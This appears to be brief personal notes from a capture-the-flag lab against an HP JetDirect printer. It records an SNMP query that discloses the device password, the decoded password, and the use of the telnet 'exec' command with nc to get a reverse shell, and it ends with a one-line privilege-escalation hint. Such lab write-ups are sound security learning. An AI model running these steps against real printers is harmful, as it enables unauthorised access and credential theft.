# Recon
only tcp 23 is open.

# Enum
# 23
telnet => "HP JetDirect"
Google and found an exploit "HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure"
=> nmpget -v1 -Cf -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
=> iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
=> P@ssw0rd@123!!12
3 (rest are non printable)
=> Tried P@ssw0rd@123!!12 => no, try P@ssw0rd@123!!123 => worked.

there is a "exec" command => use nc get a reverse shell.

# Priv Esc
Pay attention to open ports. And read exploit's code.
